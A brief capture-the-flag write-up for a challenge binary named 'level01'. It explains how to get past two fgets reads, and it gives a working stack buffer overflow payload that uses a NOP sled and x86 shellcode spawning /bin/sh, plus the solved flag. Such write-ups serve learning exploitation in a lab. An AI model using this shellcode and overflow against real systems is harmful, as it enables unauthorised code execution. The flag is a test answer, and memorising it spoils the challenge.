# Level1
The only problem here is that the program waits 2 fgets on stin, so we have to send a sentence with a "\n" to cut the reading of the 1 fgets.
Then we just have to overflow the buffer on the 2 fgets with the address of a shellcode.

The payload is :
```
export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
cat <(python -c 'print("dat_wil" + "\n" + "a" * 0x50 + "\x01\x01\xff\xff")') - | ./level01
```
Flag is **PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv**
